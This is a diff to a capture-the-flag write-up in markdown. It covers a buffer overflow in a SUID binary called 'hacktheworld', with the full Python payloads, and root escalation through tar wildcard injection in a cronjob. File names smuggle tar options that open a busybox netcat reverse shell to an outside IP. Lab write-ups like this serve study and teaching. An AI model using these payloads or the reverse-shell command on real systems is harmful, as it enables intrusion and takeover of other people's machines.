@@ -39,14 +39,21 @@ I now need to do some lateral movement. Inside magna's home directory there's a 
 Also, if I check the cronjobs, I get: <br />
 ![image](https://github.com/user-attachments/assets/e23a9977-82a5-46fc-ace3-f39124a301d8)<br />
 To exploit this cronjob I need write permissions inside `spooky`'s home directory, which I don't have. So I first need to become spooky, probably by exploiting that SUID binary. <br />
-If I try to dissassemble it, I see that there's a function called `call_bash`. But it is never called inside the main. This function executes `system(/bin/sh)'` with the privileges of spooky. Also, the main function calls `gets()`, which is vulnerable to buffer overflow. So I need to overflow the buffer with the address of `call_bash`. I check what is the address of the `call_bash` function:<br />
+If I try to dissassemble it, I see that there's a function called `call_bash`. But it is never called inside the main. This function executes `system(/bin/sh)` with the privileges of spooky. Also, the main function calls `gets()`, which is vulnerable to buffer overflow. So I need to overflow the buffer with the address of `call_bash`. I check what is the address of the `call_bash` function:<br />
 ![image](https://github.com/user-attachments/assets/4dc93c61-34ee-43f0-9b30-748d834e345b)<br />
 And it is at `0x400657`. So my final payload is `python -c "print('A' * 72 + '\x57\x06\x40\x00\x00\x00\x00\x00')" | ./hacktheworld`:<br />
 ![image](https://github.com/user-attachments/assets/b57bacec-72db-48ca-bf8b-509fa6b750fd)<br />
+The `call_bash` function gets executed. But the problem here is that the shell exits immediately after. The right paylaod to get an working interactive shell is `(python -c "print('A' * 72 + '\xbf\x06\x40\x00\x00\x00\x00\x00')";cat) | ./hacktheworld`. Here I changed two thigs:
+- First of all I inserted a `cat` at the end of the command, that is because `cat` takes input from stdin and writes on stdout. This makes sure that the shell will use the same pipe of `cat`, and will be interactive.
+- I also changed the target address to `\xbf\x06\x40\x00\x00\x00\x00\x00`. That is something I decided to do after some trial and error, and it's the target address used to spawn the shell. I honestly don't understand why it didn't work with the exact address of `call_bash`. My guess is that since there are other `call` instructions inside `call_bash`, they might fuck up the stack or somehting.. I don't know to be honest. But that payload works and I'm fine with it. <br />
+So now I can finally exploit that cronjob.
+<br />
+To exploit it I'll use tar wildcards. Just run the two following commands:
 
+        echo "" > '--checkpoint=1'
+        echo "" > '--checkpoint-action=exec=busybox nc 10.11.127.156 9001 -e sh'
+Of course change the IP address and port according to your needs. Then listen with netcat and wait for the root reverse shell!<br />
+![image](https://github.com/user-attachments/assets/9236eda1-fe9d-4782-9e6b-eb5f2daf76cc)<br />
 
-
-![image](https://github.com/user-attachments/assets/f9bdcd55-aff3-41f9-bed1-9eed55320126)
-![image](https://github.com/user-attachments/assets/70ca7f69-5092-49da-bd6c-9d69811c902b)
 
 
